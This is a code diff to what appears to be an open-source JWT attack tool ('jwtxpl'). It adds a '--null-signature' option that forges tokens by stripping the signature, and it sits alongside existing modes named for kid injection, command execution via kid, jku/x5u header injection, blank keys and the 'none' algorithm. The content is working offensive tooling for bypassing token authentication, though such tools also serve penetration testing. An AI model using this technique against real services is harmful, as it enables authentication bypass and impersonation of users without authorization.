@@ -90,7 +90,7 @@ class Cracker:
     def __init__(self, token, alg, path_to_key, user_payload, complex_payload, remove_from, add_into, auto_try, kid, exec_via_kid,
                  specified_key, jku_basic, jku_redirect, jku_header_injection, x5u_basic, x5u_header_injection, verify_token_with,
                  sub_time, add_time, find_key_from_jwks, unverified=False, blank=False, decode=False, manual=False,
-                 generate_jwk=False, dump_key=False):
+                 generate_jwk=False, dump_key=False, null_signature=False):
         """
         :param token: The user input token -> str
         :param alg: The algorithm for the attack. HS256 or None -> str
@@ -118,6 +118,7 @@ class Cracker:
         :param manual: A flag to set if the user need to craft an url manually -> Bool
         :param generate_jwk: A flag, if present a jwk will be generated and inserted in the token header -> Bool
         :param dump_key: A flag, if present the generated private key will be sotred in a file -> Bool
+        :param null_signature: A flag, if present no signature will be provided -> Bool
 
         Initialize the variables that we need to be able to access from all the class; all the params plus
         self.file and self.token. Then it call the validation method to validate some of these variables (see below),
@@ -155,8 +156,9 @@ class Cracker:
         self.manual = manual
         self.generate_jwk = generate_jwk
         self.dump_key = dump_key
+        self.null_signature = null_signature
         """Groups args based on requirements"""
-        self.no_key_validation_args = [self.verify_token_with, self.find_key_from_jwks, self.decode]
+        self.no_key_validation_args = [self.verify_token_with, self.find_key_from_jwks, self.decode, self.null_signature]
         self.jwks_args = [self.jku_basic, self.jku_redirect, self.jku_header_injection, self.x5u_basic, self.x5u_header_injection, self.generate_jwk]
         self.cant_asymmetric_args = [self.auto_try, self.kid, self.exec_via_kid, self.specified_key, self.blank]
         self.require_alg_args = [self.path_to_key] + self.cant_asymmetric_args + self.jwks_args
@@ -245,7 +247,7 @@ class Cracker:
                     sys.exit(2)
                 print(f"{Bcolors.OKBLUE}INFO: some JWT libraries use 'none' instead of 'None', make sure to try both.{Bcolors.ENDC}")
             elif self.alg.lower()[:2] in ["rs", "ps", "ec"]:
-                if not any(arg for arg in self.jwks_args + [self.path_to_key, self.verify_token_with, self.find_key_from_jwks, self.unverified]):
+                if not any(arg for arg in self.jwks_args + [self.path_to_key, self.verify_token_with, self.find_key_from_jwks, self.unverified, self.null_signature]):
                     print(f"{Bcolors.FAIL}jwtxpl: error: missing a valid key argument for EC/RSA{Bcolors.ENDC}")
                     sys.exit(4)
             if self.alg.lower() != "none":
@@ -856,7 +858,9 @@ class Cracker:
 
         :return: The generated signature.
         """
-        if self.unverified:
+        if self.null_signature:
+            signature = ""
+        elif self.unverified:
             signature = self.token_dict['signature']
         else:
             sign_hash = Cracker.get_sign_hash(self.alg)
@@ -1756,6 +1760,10 @@ if __name__ == '__main__':
                         help="Set key as a blank string. Only with HS256",
                         required=False
                         )
+    parser.add_argument("-n", "--null-signature", action="store_true",
+                        help="Generate token without signature. e.g. HEADER.PAYLOAD.SIGNATURE become HEADER.PAYLOAD.",
+                        required=False
+                        )
     parser.add_argument("-t", "--subtract-time",
                         help="Hours to delete from time claims if any ('iat', 'exp', 'nbf'). From 1 to 24",
                         metavar="<hours>", required=False
@@ -1845,7 +1853,7 @@ if __name__ == '__main__':
         args.token, args.alg, args.key, args.payload, args.complex_payload, args.remove_from, args.add_into, args.auto_try, args.inject_kid,
         args.exec_via_kid, args.specify_key, args.jku_basic, args.jku_redirect, args.jku_inbody, args.x5u_basic, args.x5u_inbody,
         args.verify_token_with, args.subtract_time, args.add_time, args.find_key_from_jwks, args.unverified, args.blank, args.decode,
-        args.manual, args.generate_jwk, args.dump_key
+        args.manual, args.generate_jwk, args.dump_key, args.null_signature
     )
 
     # Start the cracker
